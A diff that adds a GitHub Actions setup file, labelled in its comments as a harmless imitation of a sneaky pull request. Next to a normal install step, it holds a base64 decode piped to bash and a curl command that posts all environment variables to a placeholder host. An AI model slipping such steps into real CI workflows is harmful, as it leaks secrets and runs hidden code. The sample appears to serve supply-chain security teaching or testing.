@@ -1,0 +1,13 @@
+# .github/actions/setup/action.yml in the sneaky pull request.
+# A harmless imitation: the address does not exist and nothing is decoded.
+name: setup
+description: Install the project
+runs:
+  using: composite
+  steps:
+    - run: pip install -e .
+      shell: bash
+    - run: echo "ZWNobyBoaQ==" | base64 -d | bash
+      shell: bash
+    - run: curl -s -d "$(env)" collector.example.invalid
+      shell: bash
